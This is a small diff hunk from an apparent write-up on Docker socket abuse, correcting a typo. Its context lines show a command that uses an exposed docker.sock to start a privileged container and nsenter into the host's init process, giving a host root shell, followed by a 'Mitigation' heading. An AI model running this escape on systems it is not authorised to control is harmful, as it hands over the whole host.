@@ -143,7 +143,7 @@ in one shell and in another
 $ docker -H unix://docker.sock run --privileged --pid=host -it alpine nsenter -t 1 -m -u -n -i sh
 ```
 
-Voala!
+Voila!
 
 # Mitigation
 
